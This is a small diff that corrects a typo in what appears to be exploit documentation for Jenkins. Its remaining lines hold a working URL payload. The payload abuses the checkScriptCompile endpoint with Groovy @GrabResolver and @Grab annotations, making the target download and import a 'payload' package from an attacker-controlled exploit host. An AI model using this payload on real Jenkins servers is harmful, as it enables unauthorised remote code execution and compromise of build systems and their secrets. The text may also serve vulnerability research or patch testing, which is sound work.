@@ -21,6 +21,6 @@ URL Payload:
 http://<TARGET HOST>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
 ?value=
 @GrabConfig(disableChecksums=true)%0a
-@GrabResolver(name='payload', root='http://<EXPOIT HOST>')%0a
+@GrabResolver(name='payload', root='http://<EXPLOIT HOST>')%0a
 @Grab(group='package', module='payload', version='1')%0a
 import Payload;
